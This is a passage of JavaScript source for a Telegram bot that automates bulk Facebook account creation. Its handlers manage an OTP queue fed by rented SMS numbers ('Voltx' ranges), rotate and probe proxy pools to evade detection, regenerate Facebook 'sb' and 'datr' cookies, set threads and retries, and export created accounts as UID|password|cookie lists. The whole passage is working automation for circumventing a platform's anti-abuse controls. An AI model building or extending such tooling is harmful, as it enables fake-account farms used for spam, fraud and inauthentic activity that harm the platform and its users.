        appendUserLog(uid, `MANUAL OTP RESEND FAILED +${phone}: ${resendRes.reason}`);
        await sendMessage(
          chatId,
          `⚠️ <b>OTP Resend Notice</b> for <code>+${escapeHtml(phone)}</code>\n<blockquote>${escapeHtml(resendRes.reason || 'Could not trigger resend')}</blockquote>`,
          {
            inline_keyboard: [
              [
                btnOk(`🔑 Enter OTP`, `otp:enter:${phone}`),
                btnNav('⬅️ OTP Queue', 'menu:otp'),
              ],
            ],
          }
        );
      }
      return;
    }

    if (data.startsWith('otp:check:')) {
      const phone = data.slice('otp:check:'.length);
      const items = readUserPending(uid);
      const idx = items.findIndex((p) => p.phone === phone);
      if (idx === -1) {
        await sendMessage(chatId, 'Session not found in OTP queue.', {
          inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
        });
        return;
      }
      const item = items[idx];
      const cfg = readUserConfig(uid);
      const userCookie = readUserCookies(uid);
      await sendMessage(chatId, `🔎 Checking real Facebook account & login status for <code>+${escapeHtml(phone)}</code>...`);
      const chk = await checkAccountLogin(item, cfg, userCookie);
      if (chk.ok) {
        storeUserAccount(uid, {
          name: item.name,
          phone: item.phone,
          pass: item.pass || cfg.password || '',
          uid: chk.uid,
          status: 'OK',
          confirmed: true,
          cookies: chk.cookies,
        });
        items.splice(idx, 1);
        writeUserPending(uid, items);
        appendUserLog(uid, `CHECK LOGIN OK +${phone} -> UID ${chk.uid}`);
        await sendMessage(
          chatId,
          `✅ <b>Account Active!</b>\nUID|Pass: <code>${escapeHtml(chk.uid)}|${escapeHtml(item.pass || cfg.password || '')}</code>`,
          { inline_keyboard: [[btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('🔐 OTP Queue', 'menu:otp')]] }
        );
        await renderOtpQueue(chatId, uid);
      } else if (chk.notCreated) {
        await sendMessage(
          chatId,
          [
            `❌ <b>NO ACCOUNT FOUND ON FACEBOOK</b>`,
            DIVIDER,
            `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
            `<blockquote>${escapeHtml(chk.reason || 'This number was NOT registered on Facebook and has no real OTP session.')}</blockquote>`,
          ].join('\n'),
          {
            inline_keyboard: [
              [
                btnBad('🗑 Remove Broken Session', `otp:del:${phone}`),
                btnNav('⬅️ OTP Queue', 'menu:otp'),
              ],
            ],
          }
        );
      } else {
        await sendMessage(
          chatId,
          `⏳ ${escapeHtml(chk.reason || `Account +${phone} still requires OTP / checkpoint confirmation.`)}`,
          {
            inline_keyboard: [
              [
                btnOk(`🔑 Enter OTP`, `otp:enter:${phone}`),
                btnBad('🗑 Delete', `otp:del:${phone}`),
              ],
              [btnNav('⬅️ OTP Queue', 'menu:otp')],
            ],
          }
        );
      }
      return;
    }

    if (data.startsWith('otp:enter:')) {
      const phone = data.slice('otp:enter:'.length);
      promptSessions.set(uid, { kind: 'awaiting_otp', phone });
      await sendMessage(
        chatId,
        `🔑 <b>ENTER OTP CODE</b>\nReply with the OTP code for <code>+${escapeHtml(phone)}</code>:`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:otp')]] }
      );
      return;
    }

    if (data.startsWith('otp:defer:')) {
      const phone = data.slice('otp:defer:'.length);
      const items = readUserPending(uid);
      const idx = items.findIndex((p) => p.phone === phone);
      if (idx >= 0) {
        const [moved] = items.splice(idx, 1);
        if (moved) items.push(moved);
        writeUserPending(uid, items);
      }
      await renderOtpQueue(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('otp:del:') || data.startsWith('otp:skip:')) {
      const phone = data.startsWith('otp:del:') ? data.slice('otp:del:'.length) : data.slice('otp:skip:'.length);
      writeUserPending(uid, readUserPending(uid).filter((p) => p.phone !== phone));
      await renderOtpQueue(chatId, uid, msgId);
      return;
    }

    if (data === 'menu:accounts') {
      promptSessions.delete(uid);
      await renderAccountsMenu(chatId, uid, 'ready', msgId);
      return;
    }

    if (data.startsWith('accounts:view:')) {
      const view = data.slice('accounts:view:'.length);
      const filter = view === 'failed' ? 'failed' : view === 'all' ? 'all' : 'ready';
      await renderAccountsMenu(chatId, uid, filter, msgId);
      return;
    }

    if (data === 'accounts:clearconfirm') {
      await editMessage(
        chatId,
        msgId,
        [
          `⚠️ <b>CONFIRM CLEAR HISTORY</b>`,
          DIVIDER,
          `Are you sure you want to clear all account history for your Telegram ID?`,
          `<blockquote>This permanently removes your Ready, Failed, and CSV/TXT records.</blockquote>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnBad('🗑 Yes, Clear All', 'accounts:clearnow'),
              btnNav('⬅️ Back (Keep)', 'menu:accounts'),
            ],
          ],
        }
      );
      return;
    }

    if (data === 'accounts:clearnow') {
      clearUserAccounts(uid);
      await renderAccountsMenu(chatId, uid, 'ready', msgId);
      return;
    }

    if (data === 'accounts:lastcookie') {
      const allAccs = readUserAccounts(uid);
      const latest = allAccs.find((a) => a.status === 'OK') || allAccs[0];
      if (!latest) {
        await sendMessage(chatId, 'No accounts logged yet.', {
          inline_keyboard: [[btnNav('⬅️ Accounts Vault', 'menu:accounts')]],
        });
        return;
      }
      const cstr = Object.entries(latest.cookies || {}).map(([k, v]) => `${k}=${v}`).join('; ') || '-';
      const cappedCookie = cstr.length > 1800 ? cstr.slice(0, 1800) + '...' : cstr;
      await sendMessage(
        chatId,
        [
          `🔍 <b>LATEST ACCOUNT DETAILS</b>`,
          DIVIDER,
          `🔑 <b>UID|Pass:</b> <code>${escapeHtml(latest.uid || '-')}|${escapeHtml(latest.password)}</code>`,
          `📱 <b>Number:</b> <code>+${escapeHtml(latest.number)}</code>`,
          `📌 <b>Status:</b> <b>${escapeHtml(latest.status)}</b>`,
          ``,
          `<blockquote>🍪 <code>${escapeHtml(cappedCookie)}</code></blockquote>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnNav('📦 Accounts Vault', 'menu:accounts'),
              btnNav('⬅️ Main Menu', 'menu:home'),
            ],
          ],
        }
      );
      return;
    }

    if (data === 'accounts:txt') {
      const seenUids = new Set();
      const okLines = readUserAccounts(uid)
        .filter((a) => a.status === 'OK' && a.uid && !seenUids.has(a.uid) && (seenUids.add(a.uid), true))
        .map((a) => `${a.uid}|${a.password}`);
      await sendDocumentText(chatId, `NEW_ACCOUNT_SUCCESS_${uid}.txt`, okLines.join('\n') || 'No ready accounts yet.', 'Ready UID|Password');
      return;
    }

    if (data === 'accounts:uidpasscookies') {
      const seenUids = new Set();
      const okLines = readUserAccounts(uid)
        .filter((a) => a.status === 'OK' && a.uid && !seenUids.has(a.uid) && (seenUids.add(a.uid), true))
        .map((a) => `${a.uid}|${a.password}|${formatCookieHeader(a.cookies || {})}`);
      await sendDocumentText(
        chatId,
        `UID_PASS_COOKIES_${uid}.txt`,
        okLines.join('\n') || 'No ready accounts yet.',
        `UID|Pass|Cookies (${okLines.length})`
      );
      return;
    }

    if (data === 'accounts:csv') {
      const header = ['timestamp', 'name', 'number', 'password', 'uid', 'status', 'confirmed', 'cookie'].join(',');
      const rows = readUserAccounts(uid).map((a) => {
        const cstr = Object.entries(a.cookies || {}).map(([k, v]) => `${k}=${v}`).join('; ');
        return [a.ts, a.name, a.number, a.password, a.uid, a.status, a.confirmed, cstr].map(csvCell).join(',');
      });
      await sendDocumentText(chatId, `siyam_export_${uid}.csv`, [header, ...rows].join('\n'), 'Full Accounts CSV');
      return;
    }

    if (data === 'accounts:loginsheet') {
      const header = ['number', 'uid', 'password', 'name', 'status'].join(',');
      const rows = readUserAccounts(uid)
        .filter((a) => a.uid)
        .map((a) => [a.number, a.uid, a.password, a.name, a.status].map(csvCell).join(','));
      await sendDocumentText(chatId, `siyam_login_sheet_${uid}.csv`, [header, ...rows].join('\n'), 'Login Sheet CSV');
      return;
    }

    if (data === 'accounts:fulltxt') {
      const files = getUserFiles(uid);
      const body = fs.existsSync(files.accountsTxt) ? fs.readFileSync(files.accountsTxt, 'utf-8') : 'No accounts logged yet.';
      await sendDocumentText(chatId, `siyam_accounts_${uid}.txt`, body, 'Full Account Blocks');
      return;
    }

    if (data === 'menu:proxies') {
      promptSessions.delete(uid);
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'proxies:add') {
      promptSessions.set(uid, { kind: 'awaiting_proxies' });
      await sendMessage(
        chatId,
        [
          `🌐 <b>ADD PROXIES TO POOL</b>`,
          DIVIDER,
          `Send your proxies (one per line, or 9Proxy batch copy-paste) or upload a <code>.txt</code> file:`,
          ``,
          `<blockquote><b>Supported formats:</b>\n• <code>user:pass:host:port</code> (9Proxy)\n• <code>host:port:user:pass</code>\n• <code>host:port@user:pass</code>\n• <code>http://user:pass@ip:port</code>\n• <code>socks5://ip:port</code> or <code>ip:port</code></blockquote>`,
        ].join('\n'),
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:proxies')]] }
      );
      return;
    }

    if (data === 'proxies:removeone') {
      const list = readUserProxies(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Your proxy pool is empty.', {
          inline_keyboard: [[btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      promptSessions.set(uid, { kind: 'awaiting_remove_proxy' });
      await sendMessage(chatId, `➖ Reply with the proxy line number (e.g. <code>1</code>) or exact proxy URL to remove:`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:proxies')]],
      });
      return;
    }

    if (data === 'proxies:test') {
      const list = readUserProxies(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Your proxy pool is empty. Add proxies first.', {
          inline_keyboard: [[btnOk('➕ Add Proxies', 'proxies:add'), btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      const batchSlice = list.slice(0, 25);
      await sendMessage(chatId, `🧪 Lite-probing <code>${batchSlice.length}</code> proxies concurrently (15x • ~1KB/proxy)...`);
      const results = new Array(batchSlice.length);
      let pIdx = 0;
      await Promise.all(
        Array.from({ length: Math.min(15, batchSlice.length) }, async () => {
          while (true) {
            const idx = pIdx++;
            if (idx >= batchSlice.length) break;
            results[idx] = await testProxyTcp(batchSlice[idx], true, { lite: true });
          }
        })
      );
      const liveCnt = results.filter((r) => r.ok).length;
      const lines = results.map((r, i) => {
        const geoParts = [r.geoInfo?.iso, r.geoInfo?.city].filter(Boolean).join('/');
        const meta = r.ok
          ? `${r.latencyMs}ms${r.exitIp ? ` • IP ${escapeHtml(r.exitIp)}` : ''}${geoParts ? ` (${escapeHtml(geoParts)})` : ''}`
          : `${r.latencyMs}ms${r.error ? ` • ${escapeHtml(r.error)}` : ''}`;
        return `${i + 1}. ${r.ok ? '✅ LIVE' : '❌ DEAD'} (<code>${meta}</code>)\n    <code>${escapeHtml(r.proxy)}</code>`;
      });
      await sendMessage(
        chatId,
        `🧪 <b>LIVE FACEBOOK PROXY PROBE (${liveCnt}/${results.length} LIVE)</b>\n${DIVIDER}\n${lines.join('\n')}`,
        {
          inline_keyboard: [
            [
              btnOk('⚡ Sort by Speed', 'proxies:sort'),
              btnBad('🧹 Prune Dead', 'proxies:prunedead'),
            ],
            [
              btnNav('🌐 Proxy Manager', 'menu:proxies'),
              btnNav('⬅️ Main Menu', 'menu:home'),
            ],
          ],
        }
      );
      return;
    }

    if (data === 'proxies:sort') {
      const list = readUserProxies(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Proxy pool is empty.', {
          inline_keyboard: [[btnOk('➕ Add Proxies', 'proxies:add'), btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      await sendMessage(chatId, `⚡ Lite-benchmarking <code>${list.length}</code> proxies concurrently (15x)...`);
      const results = new Array(list.length);
      let pIdx = 0;
      await Promise.all(
        Array.from({ length: Math.min(15, list.length) }, async () => {
          while (true) {
            const idx = pIdx++;
            if (idx >= list.length) break;
            results[idx] = await testProxyTcp(list[idx], false, { lite: true });
          }
        })
      );
      results.sort((a, b) => {
        if (a.ok !== b.ok) return a.ok ? -1 : 1;
        return a.latencyMs - b.latencyMs;
      });
      const ordered = results.map((r) => r.proxy);
      const liveCnt = results.filter((r) => r.ok).length;
      writeUserProxies(uid, ordered);
      await sendMessage(
        chatId,
        `⚡ <b>Sorted Proxy Pool!</b>\n✅ Live: <code>${liveCnt}/${ordered.length}</code> (fastest proxies placed at top).`
      );
      await renderProxiesMenu(chatId, uid);
      return;
    }

    if (data === 'proxies:prunedead') {
      const list = readUserProxies(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Proxy pool is empty.', {
          inline_keyboard: [[btnOk('➕ Add Proxies', 'proxies:add'), btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      await sendMessage(chatId, `🧹 Lite-probing <code>${list.length}</code> proxies concurrently (15x)...`);
      const results = new Array(list.length);
      let pIdx = 0;
      await Promise.all(
        Array.from({ length: Math.min(15, list.length) }, async () => {
          while (true) {
            const idx = pIdx++;
            if (idx >= list.length) break;
            results[idx] = await testProxyTcp(list[idx], false, { lite: true });
          }
        })
      );
      const live = results.filter((r) => r.ok).sort((a, b) => a.latencyMs - b.latencyMs).map((r) => r.proxy);
      const removed = list.length - live.length;
      writeUserProxies(uid, live);
      await sendMessage(chatId, `✅ Removed <code>${removed}</code> dead proxies. Kept <code>${live.length}</code> live proxies (sorted fastest-first).`);
      await renderProxiesMenu(chatId, uid);
      return;
    }

    if (data === 'proxies:refresh_now') {
      const cfg = readUserConfig(uid);
      const list = readUserProxies(uid);
      if (list.length === 0 && !cfg.proxy) {
        await sendMessage(chatId, '⚠️ No proxy configured yet. Add proxies first.', {
          inline_keyboard: [[btnOk('➕ Add Proxies', 'proxies:add'), btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      const rotatedList = list.map((p) => {
        const res = adaptProxyForSession(p, { refreshSession: true, autoCountry: false });
        return res.url || p;
      });
      if (rotatedList.length > 0) writeUserProxies(uid, rotatedList);
      if (cfg.proxy) {
        const rDef = adaptProxyForSession(cfg.proxy, { refreshSession: true, autoCountry: false });
        if (rDef.url) writeUserConfig(uid, { proxy: rDef.url });
      }
      const probeTarget = rotatedList[0] || (cfg.proxy ? adaptProxyForSession(cfg.proxy, { refreshSession: true, autoCountry: false }).url : '');
      const cap = inspectProxyCapabilities(probeTarget);
      await sendMessage(chatId, `♻️ <i>Rotating proxy session IP &amp; lite-probing live Facebook...</i>`);
      const probe = probeTarget ? await testProxyTcp(probeTarget, true, { lite: true }) : { ok: false, error: 'no proxy' };
      const g = probe.geoInfo || {};
      const geoLine = [g.iso || cap.countryCode, g.country, g.city].filter(Boolean).join(' • ');
      await sendMessage(
        chatId,
        [
          `♻️ <b>PROXY SESSION IP REFRESHED</b>`,
          DIVIDER,
          `🆔 <b>New Session ID:</b> <code>${escapeHtml(cap.sessionId || 'rotated')}</code>  •  🌍 <b>Region:</b> <code>${escapeHtml(geoLine || 'AUTO')}</code>`,
          `🌐 <b>New Exit IP:</b> <code>${escapeHtml(probe.exitIp || (probe.ok ? 'Connected' : 'Check failed'))}</code> (${probe.latencyMs || 0}ms)`,
          g.isp ? `📡 <b>ISP:</b> <i>${escapeHtml(g.isp)}</i>` : '',
          `📊 <b>Live FB Probe:</b> ${probe.ok ? '✅ LIVE (FB Reachable)' : `❌ ${escapeHtml(probe.error || 'failed')}`}`,
        ].filter(Boolean).join('\n'),
        {
          inline_keyboard: [
            [
              btnOk('♻️ Rotate Again', 'proxies:refresh_now'),
              btnNav('🌐 Proxy Manager', 'menu:proxies'),
            ],
          ],
        }
      );
      return;
    }

    if (data === 'proxies:toggle_autorefresh') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { auto_proxy_refresh: cfg.auto_proxy_refresh === false });
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'proxies:toggle_autocountry') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { auto_proxy_country: cfg.auto_proxy_country === false });
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'proxies:toggle_pxsaver') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { proxy_saver: cfg.proxy_saver === false });
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'proxies:clear') {
      writeUserProxies(uid, []);
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'menu:settings') {
      promptSessions.delete(uid);
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cc') {
      const curCc = readUserConfig(uid).cc;
      promptSessions.set(uid, { kind: 'awaiting_cc' });
      const ccBtn = (code, label) => (curCc === code ? btnOk(`✅ ${label}`, `setcc:${code}`) : btnNav(label, `setcc:${code}`));
      await sendMessage(
        chatId,
        `🌍 <b>SELECT COUNTRY CODE</b>\n${DIVIDER}\nPick a preset below or type digits directly (e.g. <code>880</code>, <code>91</code>, <code>1</code>):`,
        {
          inline_keyboard: [
            [ccBtn('880', '+880 (BD)'), ccBtn('91', '+91 (IN)'), ccBtn('92', '+92 (PK)')],
            [ccBtn('1', '+1 (US)'), ccBtn('44', '+44 (UK)'), ccBtn('60', '+60 (MY)')],
            [btnBad('❌ Cancel', 'menu:settings')],
          ],
        }
      );
      return;
    }

    if (data.startsWith('setcc:')) {
      const ccVal = data.slice('setcc:'.length).replace(/\D/g, '');
      if (ccVal) {
        promptSessions.delete(uid);
        writeUserConfig(uid, { cc: ccVal });
        await renderSettings(chatId, uid, msgId);
      }
      return;
    }

    if (data === 'set:pw') {
      promptSessions.set(uid, { kind: 'awaiting_password' });
      await sendMessage(chatId, `🔑 <b>SET DEFAULT PASSWORD</b>\nEnter the default password for created accounts (min 6 chars):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:viewpw') {
      const cfg = readUserConfig(uid);
      await sendMessage(
        chatId,
        `👁 <b>SAVED DEFAULT PASSWORD</b>\n${DIVIDER}\n<code>${cfg.password ? escapeHtml(cfg.password) : '(empty)'}</code>`,
        { inline_keyboard: [[btnNav('⚙️ Back to Settings', 'menu:settings')]] }
      );
      return;
    }

    if (data === 'set:proxy') {
      promptSessions.set(uid, { kind: 'awaiting_default_proxy' });
      await sendMessage(
        chatId,
        `🌐 <b>SET DEFAULT PROXY</b>\nEnter default proxy (e.g. <code>user:pass:host:port</code> or <code>http://user:pass@ip:port</code>), or send <code>-</code> to clear:`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]] }
      );
      return;
    }

    if (data === 'set:delay') {
      promptSessions.set(uid, { kind: 'awaiting_delay' });
      await sendMessage(chatId, `⏱ <b>SET DELAY</b>\nEnter delay in seconds between attempts (<code>0–60</code>, default <code>2</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:batch') {
      promptSessions.set(uid, { kind: 'awaiting_batch' });
      await sendMessage(chatId, `📦 <b>SET BATCH BREAK SIZE</b>\nEnter batch break size (<code>0</code> = off, default <code>0</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:retries') {
      promptSessions.set(uid, { kind: 'awaiting_retries' });
      await sendMessage(chatId, `🔁 <b>SET RETRIES</b>\nEnter number retries per account (<code>2–12</code>, default <code>4</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:timeout') {
      promptSessions.set(uid, { kind: 'awaiting_timeout' });
      await sendMessage(chatId, `⌛ <b>SET TIMEOUT</b>\nEnter HTTP request timeout in seconds (<code>5–120</code>, default <code>18</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:toggle_fresh') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { fresh_id: !cfg.fresh_id });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_skip') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { skip_probe: !cfg.skip_probe });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_resume') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { resume_mode: cfg.resume_mode === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_strictpx') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { strict_proxy: cfg.strict_proxy === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_autorefresh') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { auto_proxy_refresh: cfg.auto_proxy_refresh === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_autocountry') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { auto_proxy_country: cfg.auto_proxy_country === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_gql') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { precheck_gql: cfg.precheck_gql === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cycle_engine') {
      const cfg = readUserConfig(uid);
      const order = ['hybrid', 'limited', 'classic'];
      const cur = order.indexOf(cfg.engine_mode || 'hybrid');
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { engine_mode: next });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_pxsaver') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { proxy_saver: cfg.proxy_saver === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_gqldirect') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { gql_via_direct: cfg.gql_via_direct === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cycle_otpresend') {
      const cfg = readUserConfig(uid);
      const order = [2, 3, 1, 0];
      const cur = order.indexOf(Number(cfg.auto_otp_resend ?? 2));
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { auto_otp_resend: next });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:turbo') {
      writeUserConfig(uid, { delay: 0, batch: 0, retries: 3, timeout: 15, threads: 6 });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cycle_threads') {
      const cfg = readUserConfig(uid);
      const order = [1, 2, 3, 4, 5, 6, 8];
      const cur = order.indexOf(Number(cfg.threads ?? 4));
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { threads: next });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cycle_pxmode') {
      const cfg = readUserConfig(uid);
      const order = ['rotate', 'fastest', 'random'];
      const cur = order.indexOf(cfg.proxy_mode || 'rotate');
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { proxy_mode: next });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'menu:diagnose') {
      promptSessions.delete(uid);
      await runAndSendDiagnose(chatId, uid);
      return;
    }

    if (data === 'menu:cookie') {
      promptSessions.delete(uid);
      await renderCookiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'cookies:regen') {
      regenUserCookies(uid);
      await renderCookiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'cookies:fresh_all') {
      wipeUserCookiesAndCache(uid);
      await sendMessage(
        chatId,
        [
          `🧼 <b>1-CLICK FRESH COOKIES &amp; CACHE CLEARED!</b>`,
          DIVIDER,
          `✅ Fresh Facebook <code>sb + datr</code> cookies generated`,
          `✅ Processed Done history, Logs &amp; number caches cleared`,
          `<i>All your FB sessions &amp; future IDs will stay clean &amp; fresh!</i>`,
        ].join('\n'),
        { inline_keyboard: [[btnOk('🚀 Dashboard', 'menu:home'), btnNav('🍪 Cookies Menu', 'menu:cookie')]] }
      );
      return;
    }

    if (data === 'user:wipe_all_confirm') {
      await editMessage(
        chatId,
        msgId,
        [
          `⚠️ <b>1-CLICK WIPE ALL PERSONAL DATA</b>`,
          DIVIDER,
          `This will permanently delete YOUR saved:`,
          `• All Facebook Cookies &amp; Done History`,
          `• All Saved Accounts Vault &amp; OTP Queue`,
          `• All Personal Proxies &amp; Debug Logs`,
          `<i>(Only affects your Telegram ID; other users are untouched.)</i>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [btnBad('🗑 YES, WIPE EVERYTHING NOW', 'user:wipe_all_now')],
            [btnNav('❌ Cancel', 'menu:cookie')],
          ],
        }
      );
      return;
    }

    if (data === 'user:wipe_all_now') {
      wipeAllUserData(uid);
      await editMessage(
        chatId,
        msgId,
        `✅ <b>ALL PERSONAL DATA WIPED CLEAN!</b>\n${DIVIDER}\nFresh cookies initialized and all your cookies, caches, proxies, OTP queue, logs &amp; accounts vault have been cleared.`,
        { inline_keyboard: [[btnOk('🚀 Main Dashboard', 'menu:home')]] }
      );
      return;
    }

    if (data === 'cookies:edit') {
      promptSessions.set(uid, { kind: 'awaiting_cookies' });
      await sendMessage(
        chatId,
        `🍪 <b>PASTE CUSTOM COOKIES</b>\nPaste your custom Facebook cookie header string below (e.g. <code>datr=...; sb=...; wd=360x800</code>):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:cookie')]] }
      );
      return;
    }

    if (data === 'menu:voltx') {
      promptSessions.delete(uid);
      await renderVoltxMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'voltx:setkey') {
      promptSessions.set(uid, { kind: 'awaiting_voltx_key' });
      await sendMessage(
        chatId,
        `🔑 <b>SET VOLTX API KEY</b>\n${DIVIDER}\nPaste your Voltx <code>mauthapi</code> key below (or send <code>-</code> to clear):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:voltx')]] }
      );
      return;
    }

    if (data === 'voltx:custom_rid') {
      promptSessions.set(uid, { kind: 'awaiting_voltx_rid' });
      await sendMessage(
        chatId,
        `✏️ <b>ENTER VOLTX RANGE ID</b>\n${DIVIDER}\nSend the Range digits or pattern (e.g. <code>26134</code> or <code>22501XXX</code>):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:voltx')]] }
      );
      return;
    }

    if (data === 'voltx:custom_count') {
      const cfgNow = readUserConfig(uid);
      if (!cfgNow.voltx_last_rid) {
        await sendMessage(chatId, '⚠️ Pick a range first.', { inline_keyboard: [[btnOk('📋 Browse Ranges', 'voltx:ranges:0')]] });
        return;
      }
      promptSessions.set(uid, { kind: 'awaiting_voltx_count' });
      await sendMessage(
        chatId,
        `🔢 <b>VOLTX AUTO CREATE COUNT</b>\nSelected Range RID: <code>${escapeHtml(cfgNow.voltx_last_rid)}</code>\nEnter how many Facebook accounts to create (<code>1–50</code>):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:voltx')]] }
      );
      return;
    }

    if (data.startsWith('voltx:ranges:')) {
      const page = Number(data.slice('voltx:ranges:'.length)) || 0;
      await renderVoltxRanges(chatId, uid, page, false, msgId);
      return;
    }

    if (data.startsWith('voltx:ranges_ref:')) {
      const page = Number(data.slice('voltx:ranges_ref:'.length)) || 0;
      await renderVoltxRanges(chatId, uid, page, true, msgId);
      return;
    }

    if (data.startsWith('voltx:pick:')) {
      const ridRaw = data.slice('voltx:pick:'.length);
      const cleanRid = normalizeVoltxRid(ridRaw);
      const cached = voltxRangeCache.get(uid);
      const found = cached?.ranges?.find((r) => r.rid === cleanRid);
      writeUserConfig(uid, { voltx_last_rid: cleanRid, voltx_last_range: found?.label || cleanRid });
      await renderVoltxMenu(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('voltx:start:')) {
      const cnt = Math.max(1, Math.min(50, Number(data.slice('voltx:start:'.length)) || 1));
      const cfgNow = readUserConfig(uid);
      await startVoltxAutoRun(chatId, user, cfgNow.voltx_last_rid, cnt);
      return;
    }

    if (data === 'voltx:otps') {
      const { apiKey, baseUrl } = resolveVoltxCreds(uid);
      if (!apiKey) {
        await sendMessage(chatId, '⚠️ Set your Voltx API key first.', {
          inline_keyboard: [[btnOk('🔑 Set API Key', 'voltx:setkey'), btnNav('⬅️ Back', 'menu:voltx')]],
        });
        return;
      }
      const res = await voltxGetSuccessOtps(baseUrl, apiKey);
      if (!res.ok) {
        await sendMessage(chatId, `❌ Failed to load Voltx OTPs: <code>${escapeHtml(res.message)}</code>`, {
          inline_keyboard: [[btnNav('⬅️ Voltx Menu', 'menu:voltx')]],
        });
        return;
      }
      const preview = res.otps.slice(0, 12).map((o, i) => {
        const code = extractFbOtpFromSms(o.message);
        const dt = o.time ? new Date(Number(o.time)).toISOString().slice(11, 19) : '';
        return `${i + 1}. <code>+${escapeHtml(String(o.number || ''))}</code> ${code ? `→ <b>${escapeHtml(code)}</b>` : ''} <i>(${dt})</i>\n    <code>${escapeHtml(String(o.message || '').slice(0, 75))}</code>`;
      }).join('\n');
      await sendMessage(
        chatId,
        `📬 <b>VOLTX RECENT OTPs (${res.otps.length})</b>\n${DIVIDER}\n${preview || '<i>No recent OTPs in your Voltx account yet.</i>'}`,
        {
          inline_keyboard: [
            [btnOk('📡 Sync & Verify Pending', 'otp:voltx_sync'), btnNav('⬅️ Voltx Menu', 'menu:voltx')],
          ],
        }
      );
      return;
    }

    if (data === 'menu:stop') {
      const run = activeRuns.get(uid);
      if (run?.running) {
        run.abortRequested = true;
        await sendMessage(chatId, '🛑 Stopping your active batch run...', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
      } else {
        await sendMessage(chatId, 'ℹ️ No active batch run is currently running.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
      }
      return;
    }

    if (data.startsWith('admin:')) {
      if (!isAdmin) {
        await sendMessage(chatId, '⛔ Admin access only.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      if (data === 'admin:home') {
